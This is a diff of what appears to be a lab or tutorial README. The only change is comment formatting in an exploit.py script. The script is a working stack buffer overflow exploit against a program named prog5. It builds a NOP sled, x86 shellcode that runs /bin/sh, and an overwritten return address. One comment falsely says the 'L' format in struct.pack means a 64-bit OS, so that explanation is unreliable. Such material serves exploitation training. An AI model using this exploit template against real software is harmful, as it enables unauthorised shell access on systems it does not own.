@@ -212,24 +212,24 @@ To remedy this you can create a python file (exploit.py) shown below that requir
 
 // ---------- exploit.py source ------------------ //
 
-# run with prog5 $(python exploit.py)
+#run with prog5 $(python exploit.py)
 
 #!/usr/bin/env python
 
 import sys, struct
 
-# buf_len is the length of your input from the start of the buffer to the begging of the return address.
-# ret_addr is the return address that brings you back into your NOPS. This will CHANGE regularly
+#buf_len is the length of your input from the start of the buffer to the begging of the return address.
+#ret_addr is the return address that brings you back into your NOPS. This will CHANGE regularly
 buf_len = 520
 ret_addr = 0xffff4ac0
 
 
-# payload is the correctly presented shell code.
+#payload is the correctly presented shell code.
 payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
 
 
-# combining all the above. '<' means little-endian in the struct.pack and 'L' signifies 64 bit OS.
+#combining all the above. '<' means little-endian in the struct.pack and 'L' signifies 64 bit OS.
 buf = ('\x90' * (buf_len - len(payload))) + payload + struct.pack('<L', ret_addr)
 
-# writing to the shell
+#writing to the shell
 sys.stdout.write(buf)
